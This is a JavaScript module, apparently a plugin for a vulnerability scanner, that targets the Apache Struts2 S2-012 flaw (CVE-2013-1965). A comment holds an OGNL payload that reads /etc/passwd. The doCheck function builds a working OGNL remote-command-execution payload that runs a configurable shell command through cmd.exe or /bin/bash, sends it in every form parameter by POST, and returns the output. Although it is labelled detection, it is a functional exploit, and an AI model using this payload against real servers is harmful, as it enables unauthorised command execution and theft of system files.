
module.exports={
	tags:"struts2,012,cve-2013-1965,parms,20131965",
	des:"CVE-2013-1965,struts2 012Vulnerability detection",
	VulApps:[
		"https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-012",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-012.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-012",
		"https://nvd.nist.gov/vuln/detail/CVE-2013-1965"],
	/*
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量
<result name="redirect" type="redirect">/index.jsp?name=${name}</result>

	*/
	doCheck:function (url,fnCbk,parms)
	{
		var _t = this,_s = _t.self;
		var s = "%{#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
			+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
			+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + _s.g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + _s.g_szCmd + "\"})"
			+ ",#p=new java.lang.ProcessBuilder(#cmds)"
			+ ",#as=new java.lang.String()"
			+ ",#p.redirectErrorStream(true),#process=#p.start()"
			+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
			+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
			+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
			+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
			+ ",#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()"
			+ ",#f.println(#as)"
			+ ",#f.flush()"
			+ ",#f.close()"
			+"}";
			// 
			parms || (parms = {});
			for(var k in parms)
				parms[k] = s;
			// console.log(s);

			_s.request(_s.fnOptHeader({method: 'POST',uri: url
			    ,"formData":parms
			    ,headers:
			    {
			    	"User-Agent": _s.g_szUa,
			    	"Content-Type":"multipart/form-data"
			    }})
			  ,function (error, response, body){
			  		_s.error(error);
			  		if(body)
			  		{
			  			_s.fnShowBody(body);
			  			// console.log(body);
			  			_s.fnDoBody(body,"s2-012",url,null,function(o)
				    	{
				    		var r = {"url":url,"send":s};
			  				fnCbk(_s.copyO2O(r,o),_t);
				    	});
			  		}
			    }
			  );
	}
};